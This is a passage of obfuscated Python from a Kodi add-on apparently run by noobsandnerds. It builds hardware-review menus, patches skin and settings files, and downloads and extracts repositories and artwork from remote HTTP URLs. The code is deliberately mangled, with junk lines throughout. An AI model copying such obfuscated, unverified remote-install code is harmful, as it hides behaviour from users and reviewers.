 Ii1II111iIi = Ii1i1 [ 0 ] if ( len ( Ii1i1 ) > 0 ) else ''
 oo00ooOOoo = iiiIiIIiIiiii [ 0 ] if ( len ( iiiIiIIiIiiii ) > 0 ) else ''
 O000OOOo = o00O0OooO0 [ 0 ] if ( len ( o00O0OooO0 ) > 0 ) else ''
 oO0o0o0o0o0o0 = iii1II11II1 [ 0 ] if ( len ( iii1II11II1 ) > 0 ) else ''
 Ii1Ii = I11i1Iii1I [ 0 ] if ( len ( I11i1Iii1I ) > 0 ) else ''
 iII = iIIiII1 [ 0 ] if ( len ( iIIiII1 ) > 0 ) else ''
 OOoOOooO = iI1Iii1i1 [ 0 ] if ( len ( iI1Iii1i1 ) > 0 ) else ''
 i1111II1iIII = OoOo00oOoo0oO [ 0 ] if ( len ( OoOo00oOoo0oO ) > 0 ) else ''
 I1ii11ii1iiI = i1ii1iIII [ 0 ] if ( len ( i1ii1iIII ) > 0 ) else ''
 oO0oo0 = ooooooo0000oo0 [ 0 ] if ( len ( ooooooo0000oo0 ) > 0 ) else ''
 IiIiI1 = O0oooo000o [ 0 ] if ( len ( O0oooo000o ) > 0 ) else ''
 iiiI1III1 = IIiIiI11II [ 0 ] if ( len ( IIiIiI11II ) > 0 ) else ''
 Oo00OO = oOo00 [ 0 ] if ( len ( oOo00 ) > 0 ) else ''
 iIi111 = Oooo [ 0 ] if ( len ( Oooo ) > 0 ) else 'None'
 I11I1I = I1iIiii [ 0 ] if ( len ( I1iIiii ) > 0 ) else ''
 i1i1ii1 = str ( '[COLOR=dodgerblue]Added: [/COLOR]' + OOo0ooOOOo0O0 + '[CR][COLOR=dodgerblue]Manufacturer: [/COLOR]' + iii1Ii + '[CR][COLOR=dodgerblue]Supported Roms: [/COLOR]' + iiiI1 + '[CR][COLOR=dodgerblue]Chipset: [/COLOR]' + oo + '[CR][COLOR=dodgerblue]CPU: [/COLOR]' + iiiI1ii + '[CR][COLOR=dodgerblue]GPU: [/COLOR]' + iIIiiIIIII + '[CR][COLOR=dodgerblue]RAM: [/COLOR]' + iiiII + '[CR][COLOR=dodgerblue]Flash: [/COLOR]' + Oo0OooII1iII11 + '[CR][COLOR=dodgerblue]Wi-Fi: [/COLOR]' + iiiI1IiIi1i1I + '[CR][COLOR=dodgerblue]Bluetooth: [/COLOR]' + O0Oooo + '[CR][COLOR=dodgerblue]LAN: [/COLOR]' + IiiI11Iii + '[CR][CR][COLOR=darkcyan]About: [/COLOR]' + IiIi11Iii + '[CR][CR][COLOR=darkcyan]Summary:[/COLOR][CR][CR][COLOR=dodgerblue]Pros:[/COLOR]    ' + I1Iii1 + '[CR][CR][COLOR=dodgerblue]Cons:[/COLOR]  ' + Ii1II111iIi + '[CR][CR][COLOR=darkcyan]Benchmark Results:[/COLOR][CR][CR][COLOR=dodgerblue]Boot Time:[/COLOR][CR]' + i1111II1iIII + '[CR][CR][COLOR=dodgerblue]Time taken to scan 1,000 movies (local NFO files):[/COLOR][CR]' + oo00ooOOoo + '[CR][CR][COLOR=dodgerblue]Copy 4,000 files (660.8MB) locally:[/COLOR][CR]' + I1ii11ii1iiI + '[CR][CR][COLOR=dodgerblue]Copy a MP4 file (339.4MB) locally:[/COLOR][CR]' + oO0oo0 + '[CR][CR][COLOR=dodgerblue]Ethernet Speed - Copy MP4 (339.4MB) from SMB share to device:[/COLOR][CR]' + IiIiI1 + '[CR][CR][COLOR=dodgerblue]4k Playback:[/COLOR][CR]' + O000OOOo + '[CR][CR][COLOR=dodgerblue]1080p Playback:[/COLOR][CR]' + oO0o0o0o0o0o0 + '[CR][CR][COLOR=dodgerblue]720p Playback:[/COLOR][CR]' + Ii1Ii + '[CR][CR][COLOR=dodgerblue]Audio Playback:[/COLOR][CR]' + OOoOOooO + '[CR][CR][COLOR=dodgerblue]Image Slideshow:[/COLOR][CR]' + iiiI1III1 )
 i1Ii = str ( '[COLOR=dodgerblue]Added: [/COLOR]' + OOo0ooOOOo0O0 + '[CR][COLOR=dodgerblue]Manufacturer: [/COLOR]' + iii1Ii + '[CR][COLOR=dodgerblue]Supported Roms: [/COLOR]' + iiiI1 + '[CR][COLOR=dodgerblue]Chipset: [/COLOR]' + oo + '[CR][COLOR=dodgerblue]CPU: [/COLOR]' + iiiI1ii + '[CR][COLOR=dodgerblue]GPU: [/COLOR]' + iIIiiIIIII + '[CR][COLOR=dodgerblue]RAM: [/COLOR]' + iiiII + '[CR][COLOR=dodgerblue]Flash: [/COLOR]' + Oo0OooII1iII11 + '[CR][COLOR=dodgerblue]Wi-Fi: [/COLOR]' + iiiI1IiIi1i1I + '[CR][COLOR=dodgerblue]Bluetooth: [/COLOR]' + O0Oooo + '[CR][COLOR=dodgerblue]LAN: [/COLOR]' + IiiI11Iii + '[CR][CR][COLOR=darkcyan]About: [/COLOR]' + IiIi11Iii + '[CR][CR][COLOR=darkcyan]Summary:[/COLOR][CR][CR][COLOR=dodgerblue]Pros:[/COLOR]    ' + I1Iii1 + '[CR][CR][COLOR=dodgerblue]Cons:[/COLOR]  ' + Ii1II111iIi + '[CR][CR][COLOR=orange]4k Playback:[/COLOR]  ' + O000OOOo + '[CR][CR][COLOR=orange]1080p Playback:[/COLOR]  ' + oO0o0o0o0o0o0 + '[CR][CR][COLOR=orange]720p Playback:[/COLOR]  ' + Ii1Ii + '[CR][CR][COLOR=orange]DTS Compatibility:[/COLOR]  ' + OOoOOooO + '[CR][CR][COLOR=orange]Time taken to scan 100 movies:[/COLOR]  ' + oo00ooOOoo )
 if 40 - 40: oOO00 . OoooooooOO . I1IiiI + O0 % i1IIi / oOO00
 if IiIi11Iii != '' and ii1ii111I11I1 != '' :
  IiII111i1i11 ( '' , '[COLOR=darkcyan][Text Guide][/COLOR]  Official Description' , i1i1ii1 , 'text_guide' , 'Tutorials.png' , oOoOooOo0o0 , '' , '' )
 if IiIi11Iii != '' and ii1ii111I11I1 == '' :
  IiII111i1i11 ( '' , '[COLOR=darkcyan][Text Guide][/COLOR]  Official Description' , i1Ii , 'text_guide' , 'Tutorials.png' , oOoOooOo0o0 , '' , '' )
 if iIi111 != 'None' :
  IiII111i1i11 ( '' , '[COLOR=lime][VIDEO][/COLOR]   Benchmark Review' , iIi111 , 'play_video' , 'Video_Guide.png' , oOoOooOo0o0 , '' , '' )
 if O0o00OoooO != 'None' :
  IiII111i1i11 ( '' , '[COLOR=lime][VIDEO][/COLOR]   Official Video Preview' , O0o00OoooO , 'play_video' , 'Video_Guide.png' , oOoOooOo0o0 , '' , '' )
 if I1i1Iii1i1II1 != 'None' :
  IiII111i1i11 ( '' , '[COLOR=lime][VIDEO][/COLOR]   Official Video Guide' , I1i1Iii1i1II1 , 'play_video' , 'Video_Guide.png' , oOoOooOo0o0 , '' , '' )
 if iI1IIIii != 'None' :
  IiII111i1i11 ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + IiIIi1 , iI1IIIii , 'play_video' , 'Video_Guide.png' , oOoOooOo0o0 , '' , '' )
 if I1i11ii11 != 'None' :
  IiII111i1i11 ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + iII11I1Ii1 , I1i11ii11 , 'play_video' , 'Video_Guide.png' , oOoOooOo0o0 , '' , '' )
 if OO00O0oOO != 'None' :
  IiII111i1i11 ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + o0o0oOo0oO , OO00O0oOO , 'play_video' , 'Video_Guide.png' , oOoOooOo0o0 , '' , '' )
 if Ii1iI111 != 'None' :
  IiII111i1i11 ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + IIi1IIIIi , Ii1iI111 , 'play_video' , 'Video_Guide.png' , oOoOooOo0o0 , '' , '' )
 if O0oooo00o0Oo != 'None' :
  IiII111i1i11 ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + OOOoO , O0oooo00o0Oo , 'play_video' , 'Video_Guide.png' , oOoOooOo0o0 , '' , '' )
  if 36 - 36: OoooooooOO - OoOoOO00 - OoO0O00 * i1Ii11i1i - ooOo
  if 99 - 99: o0oOOoo / I1IiiI . OO000 - OO000 * I1IiiI
def I1IIiIIiiI1i ( ) :
 IiII111i1i11 ( 'folder' , '[COLOR=darkcyan]Manual Search[/COLOR]' , 'hardware' , 'manual_search' , 'Manual_Search.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=lime]All Devices[/COLOR]' , '' , 'grab_hardware' , 'All.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=orange][Hardware][/COLOR] Game Consoles' , 'device=Console' , 'grab_hardware' , 'Consoles.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=orange][Hardware][/COLOR] HTPC' , 'device=HTPC' , 'grab_hardware' , 'HTPC.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=orange][Hardware][/COLOR] Phones' , 'device=Phone' , 'grab_hardware' , 'Phones.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=orange][Hardware][/COLOR] Set Top Boxes' , 'device=STB' , 'grab_hardware' , 'STB.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=orange][Hardware][/COLOR] Tablets' , 'device=Tablet' , 'grab_hardware' , 'Tablets.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][Accessories][/COLOR] Remotes/Keyboards' , 'device=Remote' , 'grab_hardware' , 'Remotes.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][Accessories][/COLOR] Gaming Controllers' , 'device=Controller' , 'grab_hardware' , 'Controllers.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][Accessories][/COLOR] Dongles' , 'device=Dongle' , 'grab_hardware' , 'Dongles.png' , '' , '' , '' )
 if 83 - 83: I1ii11iIi11i * II111iiii . i1Ii11i1i - OooO00OOoO00
 if 46 - 46: OoO0O00 % I1ii11iIi11i
def OO00O0O ( url ) :
 IiII111i1i11 ( 'folder' , '[COLOR=darkcyan][CPU][/COLOR] Allwinner Devices' , str ( url ) + '&chip=Allwinner' , 'grab_hardware' , 'Allwinner.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=darkcyan][CPU][/COLOR] AMLogic Devices' , str ( url ) + '&chip=AMLogic' , 'grab_hardware' , 'AMLogic.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=darkcyan][CPU][/COLOR] Intel Devices' , str ( url ) + '&chip=Intel' , 'grab_hardware' , 'Intel.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=darkcyan][CPU][/COLOR] Rockchip Devices' , str ( url ) + '&chip=Rockchip' , 'grab_hardware' , 'Rockchip.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=lime][Platform][/COLOR] Android' , str ( url ) + '&platform=Android' , 'grab_hardware' , 'Android.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=lime][Platform][/COLOR] iOS' , str ( url ) + '&platform=iOS' , 'grab_hardware' , 'iOS.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=lime][Platform][/COLOR] Linux' , str ( url ) + '&platform=Linux' , 'grab_hardware' , 'Linux.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=lime][Platform][/COLOR] OpenELEC' , str ( url ) + '&platform=OpenELEC' , 'grab_hardware' , 'OpenELEC.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=lime][Platform][/COLOR] OSX' , str ( url ) + '&platform=OSX' , 'grab_hardware' , 'OSX.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=lime][Platform][/COLOR] Pure Linux' , str ( url ) + '&platform=Custom_Linux' , 'grab_hardware' , 'Custom_Linux.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=lime][Platform][/COLOR] Windows' , str ( url ) + '&platform=Windows' , 'grab_hardware' , 'Windows.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=orange][Flash Storage][/COLOR] 4GB' , str ( url ) + '&flash=4GB' , 'grab_hardware' , 'Flash.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=orange][Flash Storage][/COLOR] 8GB' , str ( url ) + '&flash=8GB' , 'grab_hardware' , 'Flash.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=orange][Flash Storage][/COLOR] 16GB' , str ( url ) + '&flash=16GB' , 'grab_hardware' , 'Flash.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=orange][Flash Storage][/COLOR] 32GB' , str ( url ) + '&flash=32GB' , 'grab_hardware' , 'Flash.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=orange][Flash Storage][/COLOR] 64GB' , str ( url ) + '&flash=64GB' , 'grab_hardware' , 'Flash.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][RAM][/COLOR] 1GB' , str ( url ) + '&ram=1GB' , 'grab_hardware' , 'RAM.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][RAM][/COLOR] 2GB' , str ( url ) + '&ram=2GB' , 'grab_hardware' , 'RAM.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][RAM][/COLOR] 4GB' , str ( url ) + '&ram=4GB' , 'grab_hardware' , 'RAM.png' , '' , '' , '' )
 if 76 - 76: OO000 % O0 * iIii1I11I1II1 - I1ii11iIi11i % ooOo
 if 57 - 57: I1ii11iIi11i
 if 30 - 30: I1ii11iIi11i * oOO00 % oOO00 * OOOOOOoo0O . OOOOOOoo0O
def III1iIiIiII ( ) :
 O0ii1ii1ii = xbmc . getSkinDir ( )
 i1iOO = xbmc . translatePath ( os . path . join ( ooooooO0oo , O0ii1ii1ii ) )
 if 42 - 42: OoooooooOO - I1ii11iIi11i / i1IIi * I1IiiI - i1Ii11i1i - Oo
 for Oo0 , o0IiiiI111I , III1I11i1iIi in os . walk ( i1iOO ) :
  if 90 - 90: I1ii11iIi11i - OOOOOOoo0O . i11iIiiIii / I1IiiI
  for oooO in III1I11i1iIi :
   if 41 - 41: i1Ii11i1i * OoO0O00 - OOOOOOoo0O . OO000
   if 'DialogKeyboard.xml' in oooO :
    O0ii1ii1ii = os . path . join ( Oo0 , oooO )
    OOOOO0o0OOo = open ( O0ii1ii1ii ) . read ( )
    I11I11I11IiIi = OOOOO0o0OOo . replace ( '<control type="label" id="310"' , '<control type="edit" id="312"' )
    oooO = open ( O0ii1ii1ii , mode = 'w' )
    oooO . write ( I11I11I11IiIi )
    oooO . close ( )
    i1I111Ii ( O0ii1ii1ii )
    if 41 - 41: iIii1I11I1II1 - O0 - I1ii11iIi11i - ooOo + i1Ii11i1i
    for O00o in range ( 48 , 58 ) :
     ii11I1IIi1i ( O00o , O0ii1ii1ii )
     if 22 - 22: O0 % oOO00 % OOOOOOoo0O % I1IiiI
 OO0o = xbmcgui . Dialog ( )
 OO0o . ok ( "Skin Changes Successful" , 'A BIG thank you to Mikey1234 for this fix. The code used for this function was ported from the Xunity Maintenance add-on' )
 xbmc . executebuiltin ( 'ReloadSkin()' )
 if 34 - 34: OOOOOOoo0O . Oo0Ooo % I1ii11iIi11i . OOOOOOoo0O % oOO00 / oOO00
def oo0OO0O0o0O ( ) :
 OO0o = xbmcgui . Dialog ( )
 IIi1 = xbmcgui . Dialog ( ) . yesno ( 'Convert This Skin To Kodi (Helix)?' , 'This will fix the problem with a blank on-screen keyboard showing in skins designed for Gotham (being run on Kodi). This will only affect the currently running skin.' , nolabel = 'No, Cancel' , yeslabel = 'Yes, Fix' )
 if 21 - 21: OoooooooOO
 if IIi1 == 1 :
  III1iIiIiII ( )
  if 62 - 62: i11iIiiIii % Oo0Ooo * ooOo . ooOo . O0
  if 74 - 74: OoO0O00
def IIIIIiiI ( ) :
 if OO0o . yesno ( "Hide Passwords" , "This will hide all your passwords in your" , "add-on settings, are you sure you wish to continue?" ) :
  for Oo0 , o0IiiiI111I , III1I11i1iIi in os . walk ( ooooooO0oo ) :
   for oooO in III1I11i1iIi :
    if oooO == 'settings.xml' :
     i1I = open ( os . path . join ( Oo0 , oooO ) ) . read ( )
     i1iIiIi1I = re . compile ( '<setting id=(.+?)>' ) . findall ( i1I )
     for i1IIIi111111 in i1iIiIi1I :
      if 'pass' in i1IIIi111111 :
       if not 'option="hidden"' in i1IIIi111111 :
        try :
         O0Ii1iIii1I1 = i1IIIi111111 . replace ( '/' , ' option="hidden"/' )
         oooO = open ( os . path . join ( Oo0 , oooO ) , mode = 'w' )
         oooO . write ( str ( i1I ) . replace ( i1IIIi111111 , O0Ii1iIii1I1 ) )
         oooO . close ( )
        except :
         pass
  OO0o . ok ( "Passwords Hidden" , "Your passwords will now show as stars (hidden), if you want to undo this please use the option to unhide passwords." )
  if 21 - 21: OoOoOO00 + OoOoOO00 * o0oOOoo / Oo * OoooooooOO . Oo0Ooo
  if 22 - 22: o0oOOoo % OoOoOO00 / o0oOOo0O0Ooo
def oO0O ( url ) :
 iI1i111I1Ii = 'http://noobsandnerds.com/TI/Community_Builds/guisettings.php?id=%s' % ( url )
 i11i1ii1I = o0OO0o0o00o ( iI1i111I1Ii ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 i111iii1I1 = re . compile ( 'guisettings="(.+?)"' ) . findall ( i11i1ii1I )
 o0OOOoO0ooOOOo0 = i111iii1I1 [ 0 ] if ( len ( i111iii1I1 ) > 0 ) else 'None'
 if 31 - 31: OoooooooOO % i11iIiiIii - II111iiii * i11iIiiIii
 IiiII ( o0OOOoO0ooOOOo0 , ooO00 )
 if 40 - 40: i1Ii11i1i * OoOoOO00 % i1Ii11i1i - O0
 if 84 - 84: oOO00 * OOOOOOoo0O - OoooooooOO . o0oOOo0O0Ooo
def o0O0OoO0 ( path ) :
 O0o0ooo00o0O = xbmc . translatePath ( os . path . join ( Oo00OOOOO , 'background_art' , '' ) )
 if 72 - 72: o0oOOoo % OooO00OOoO00 + OoO0O00
 if os . path . exists ( O0o0ooo00o0O ) :
  O0Oo0Oo00o0o ( O0o0ooo00o0O )
  if 94 - 94: OO000 + iIii1I11I1II1
 time . sleep ( 1 )
 if 80 - 80: o0oOOo0O0Ooo . OOOOOOoo0O . OoooooooOO
 if not os . path . exists ( O0o0ooo00o0O ) :
  os . makedirs ( O0o0ooo00o0O )
  if 63 - 63: o0oOOoo . Oo
 try :
  Ooo . create ( "Installing Artwork" , "Downloading artwork pack" , '' , 'Please Wait' )
  O0000 = os . path . join ( oO0Oo , O0oo0OO0 + '_artpack.zip' )
  downloader . download ( path , O0000 , Ooo )
  time . sleep ( 1 )
  Ooo . create ( "Installing Artwork" , "Checking " , '' , 'Please Wait' )
  Ooo . update ( 0 , "" , "Extracting Zip Please Wait" )
  extract . all ( O0000 , O0o0ooo00o0O , Ooo )
  if 66 - 66: I1IiiI
 except :
  pass
  if 99 - 99: OoO0O00 % O0 . i1Ii11i1i - I1ii11iIi11i . Oo0Ooo / OoOoOO00
  if 60 - 60: I1ii11iIi11i
def oOoOoo0 ( url ) :
 if I11 == 'true' :
  IiII111i1i11 ( 'folder' , 'Search For Content' , '' , 'search_content' , 'Search_Addons.png' , '' , '' , '' )
  if 4 - 4: ooOo . OooO00OOoO00
 IiII111i1i11 ( '' , 'Install A Venztech Code' , Oo0oO0ooo , 'keywords' , 'Keywords.png' , '' , '' , '' )
 if oOo0oooo00o == 'true' :
  IiII111i1i11 ( 'folder' , 'Manage Add-ons' , iii , 'addonmenu' , 'Search_Addons.png' , '' , '' , '' )
  if 67 - 67: I1ii11iIi11i * o0oOOo0O0Ooo % iIii1I11I1II1 / oOO00
  if 34 - 34: ooOo - II111iiii - o0oOOo0O0Ooo + OOOOOOoo0O + i1Ii11i1i
  if 70 - 70: OoooooooOO + OoO0O00 * Oo0Ooo
  if 20 - 20: i11iIiiIii - II111iiii - o0oOOoo % ooOo . o0oOOoo
  if 50 - 50: iIii1I11I1II1 + i1Ii11i1i - OooO00OOoO00 - OoooooooOO
def oO00O0oO ( ) :
 xbmc . executebuiltin ( 'ActivateWindow(10040,"addons://install/",return)' )
 if 69 - 69: Oo + Oo * OO000 * OooO00OOoO00 + I1IiiI
 if 46 - 46: Oo
def Ooo0Oo0oo0 ( repo_id ) :
 ooOOO0OO = 1
 iI1i111I1Ii = 'http://noobsandnerds.com/TI/AddonPortal/dependencyinstall.php?id=%s' % ( repo_id )
 i11i1ii1I = o0OO0o0o00o ( iI1i111I1Ii ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 I11IIIi = re . compile ( 'name="(.+?)"' ) . findall ( i11i1ii1I )
 I1iI = re . compile ( 'version="(.+?)"' ) . findall ( i11i1ii1I )
 OO0 = re . compile ( 'repo_url="(.+?)"' ) . findall ( i11i1ii1I )
 o0Oooo = re . compile ( 'data_url="(.+?)"' ) . findall ( i11i1ii1I )
 iiI = re . compile ( 'zip_url="(.+?)"' ) . findall ( i11i1ii1I )
 Iiii1iI1i = re . compile ( 'repo_id="(.+?)"' ) . findall ( i11i1ii1I )
 OOo000o0 = I11IIIi [ 0 ] if ( len ( I11IIIi ) > 0 ) else ''
 iII1iii = I1iI [ 0 ] if ( len ( I1iI ) > 0 ) else ''
 OooO0o = OO0 [ 0 ] if ( len ( OO0 ) > 0 ) else ''
 Oo00o = o0Oooo [ 0 ] if ( len ( o0Oooo ) > 0 ) else ''
 IIIi1ii = iiI [ 0 ] if ( len ( iiI ) > 0 ) else ''
 Ii1iii11I = Iiii1iI1i [ 0 ] if ( len ( Iiii1iI1i ) > 0 ) else ''
 I11i = xbmc . translatePath ( os . path . join ( IiIIIi1iIi , Ii1iii11I + '.zip' ) )
 IIi1Iii = xbmc . translatePath ( os . path . join ( ooooooO0oo , Ii1iii11I ) )
 if 96 - 96: OOOOOOoo0O % OOOOOOoo0O % i1Ii11i1i / i1Ii11i1i - I1ii11iIi11i
 Ooo . create ( 'Installing Repository' , 'Please wait...' , '' )
 if 11 - 11: Oo / OoooooooOO * OO000
 try :
  downloader . download ( OooO0o , I11i , Ooo )
  extract . all ( I11i , ooooooO0oo , Ooo )
  xbmc . executebuiltin ( 'UpdateLocalAddons' )
  xbmc . executebuiltin ( 'UpdateAddonRepos' )
  if 73 - 73: i1Ii11i1i / o0oOOoo + i1Ii11i1i / Oo / ooOo + Oo
 except :
  if 11 - 11: iIii1I11I1II1 * Oo0Ooo % ooOo . o0oOOoo - I1ii11iIi11i * i11iIiiIii
  try :
   downloader . download ( IIIi1ii , I11i , Ooo )
   extract . all ( I11i , ooooooO0oo , Ooo )
   xbmc . executebuiltin ( 'UpdateLocalAddons' )
   xbmc . executebuiltin ( 'UpdateAddonRepos' )
   if 33 - 33: OOOOOOoo0O % OoooooooOO / ooOo
  except :
   if 12 - 12: I1ii11iIi11i - iIii1I11I1II1 * OoOoOO00 + o0oOOo0O0Ooo . OooO00OOoO00
   try :
    if 59 - 59: OOOOOOoo0O . i1IIi
    if not os . path . exists ( IIi1Iii ) :
     os . makedirs ( IIi1Iii )
     if 31 - 31: I1IiiI + I1IiiI
    i11i1ii1I = o0OO0o0o00o ( Oo00o ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
    i1iIiIi1I = re . compile ( 'href="(.+?)"' , re . DOTALL ) . findall ( i11i1ii1I )
    if 11 - 11: oOO00 + OoOoOO00 % o0oOOo0O0Ooo * OoO0O00 / oOO00
    for oOooO0 in i1iIiIi1I :
     O0O0ooOOO = xbmc . translatePath ( os . path . join ( IIi1Iii , oOooO0 ) )
     if 5 - 5: OOOOOOoo0O / ooOo % o0oOOoo . i11iIiiIii % OoOoOO00 + ooOo
     if I1iii11 not in oOooO0 and '/' not in oOooO0 :
      if 95 - 95: I1ii11iIi11i
      try :
       Ooo . update ( 0 , "Downloading [COLOR=darkcyan]" + oOooO0 + '[/COLOR]' , '' , 'Please wait...' )
       downloader . download ( Oo00o + oOooO0 , O0O0ooOOO , Ooo )
       if 48 - 48: OooO00OOoO00
      except :
       print "failed to install" + oOooO0
       if 14 - 14: iIii1I11I1II1 / o0oOOo0O0Ooo * oOO00
     if '/' in oOooO0 and '..' not in oOooO0 and 'http' not in oOooO0 :
      iiOOOO0o = Oo00o + oOooO0
      i1I1iIi1IiI ( O0O0ooOOO , iiOOOO0o )
      if 35 - 35: iIii1I11I1II1
   except :
    OO0o . ok ( "Error downloading repository" , 'There was an error downloading[CR][COLOR=dodgerblue]' + OOo000o0 + '[/COLOR]. Please consider updating the add-on portal with details or report the error on the forum at [COLOR=orange]www.noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds.com[/COLOR]' )
    ooOOO0OO = 0
    if 34 - 34: OoO0O00 % I1IiiI . o0oOOo0O0Ooo % OoO0O00 % OoO0O00
    if 30 - 30: I1IiiI + I1IiiI
 if ooOOO0OO == 1 :
  time . sleep ( 1 )
  Ooo . update ( 0 , "[COLOR=darkcyan]" + OOo000o0 + '[/COLOR]  [COLOR=lime]Successfully Installed[/COLOR]' , '' , 'Now installing dependencies' )
  time . sleep ( 1 )
  i1iiiIii11 = 'http://noobsandnerds.com/TI/AddonPortal/downloadcount.php?id=%s' % ( repo_id )
  try :
   o0OO0o0o00o ( i1iiiIii11 )
  except :
   pass
   if 75 - 75: I1IiiI - o0oOOoo - I1IiiI % ooOo % OoooooooOO
   if 13 - 13: o0oOOoo * OoO0O00 % iIii1I11I1II1 / oOO00 * OOOOOOoo0O . Oo0Ooo
def I1i1 ( ) :
 IiII111i1i11 ( '' , '[COLOR=dodgerblue][TEXT GUIDE][/COLOR]  What is Community Builds?' , 'url' , 'instructions_3' , 'How_To.png' , '' , '' , '' )
 IiII111i1i11 ( '' , '[COLOR=dodgerblue][TEXT GUIDE][/COLOR]  Creating a Community Build' , 'url' , 'instructions_1' , 'How_To.png' , '' , '' , '' )
 IiII111i1i11 ( '' , '[COLOR=dodgerblue][TEXT GUIDE][/COLOR]  Installing a Community Build' , 'url' , 'instructions_2' , 'How_To.png' , '' , '' , '' )
 IiII111i1i11 ( '' , '[COLOR=lime][VIDEO GUIDE][/COLOR]  Add Your Own Guides @ [COLOR=orange]www.noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds.com[/COLOR]' , 'K0XIxEodUhc' , 'play_video' , 'How_To.png' , '' , '' , '' )
 IiII111i1i11 ( '' , '[COLOR=lime][VIDEO GUIDE][/COLOR]  Community Builds FULL GUIDE' , "ewuxVfKZ3Fs" , 'play_video' , 'howto.png' , '' , '' , '' )
 IiII111i1i11 ( '' , '[COLOR=lime][VIDEO GUIDE][/COLOR]  IMPORTANT initial settings' , "1vXniHsEMEg" , 'play_video' , 'howto.png' , '' , '' , '' )
 IiII111i1i11 ( '' , '[COLOR=lime][VIDEO GUIDE][/COLOR]  Install a Community Build' , "kLsVOapuM1A" , 'play_video' , 'howto.png' , '' , '' , '' )
 IiII111i1i11 ( '' , '[COLOR=lime][VIDEO GUIDE][/COLOR]  Fixing a half installed build (guisettings.xml fix)' , "X8QYLziFzQU" , 'play_video' , 'howto.png' , '' , '' , '' )
 IiII111i1i11 ( '' , '[COLOR=lime][VIDEO GUIDE][/COLOR]  [COLOR=darkcyan](OLD METHOD)[/COLOR]Create a Community Build (part 1)' , "3rMScZF2h_U" , 'play_video' , 'howto.png' , '' , '' , '' )
 IiII111i1i11 ( '' , '[COLOR=lime][VIDEO GUIDE][/COLOR]  [COLOR=darkcyan](OLD METHOD)[/COLOR]Create a Community Build (part 2)' , "C2IPhn0OSSw" , 'play_video' , 'howto.png' , '' , '' , '' )
 if 89 - 89: oOO00 % i11iIiiIii . i11iIiiIii + ooOo / I1ii11iIi11i
 if 19 - 19: I1IiiI
def OO0OO0 ( ) :
 TXT . TXT ( 'Creating A Backup To Share' ,
 '[COLOR=gold]THE OPTIONS:[/COLOR][CR]There are 3 options when choosing to create a backup, we shall explain here the differences between them:[CR][CR]'
 '[COLOR=dodgerblue]1. noobsandnerds Community Build[/COLOR] - This is by far the best way to create a build that you want to share with others, it will create a zip file for you to share that can only be used on with this add-on. The size of the zip will be incredibly small compared to other backup options out there and it will also do lots of other clever stuff too such as error checking against the Addon Portal and the addons will always be updated via the relevant developer repositories. Added to this when it comes to updating it\'s a breeze, only the new addons not already on the system will be installed and for the majority of builds Kodi won\'t even have to restart after installing![CR][CR]'
 '[COLOR=dodgerblue]2. Universal Build[/COLOR] - This was the original method created by TotalXBMC, we would really only recommend this if for some strange reason you want your build available on other inferior wizards. The zip size is much larger and every time someone wants to update their build they have to download and install the whole thing again which can be very frustrating and time consuming. The whole build is backed up in full with the exception of the packages and thumbnails folder. Just like the option above all physical paths (so long as they exist somewhere in the Kodi environment) will be changed to special paths so they work on all devices.[CR][CR]'
 '[COLOR=dodgerblue]3. Full Backup[/COLOR] - It\'s highly unlikely you will ever want to use this option and it\'s more for the geeks out there. It will create a complete backup of your setup and not do any extra clever stuff. Things like packages will remain intact as will temp cache files, be warned the size could be VERY large![CR][CR]'
 '[CR][COLOR=gold]CREATING A COMMUNITY BUILD:[/COLOR][CR][CR][COLOR=blue][B]Step 1:[/COLOR] Remove any sensitive data[/B][CR]Make sure you\'ve removed any sensitive data such as passwords and usernames in your addon_data folder.'
 '[CR][CR][COLOR=dodgerblue][B]Step 2:[/COLOR] Backup your system[/B][CR]Choose the backup option you want from the list on the previous page, if you\'re sharing this via the CP Addon then please use the noobsandnerds backup option, this will create two zip files that you need to upload to a server.'
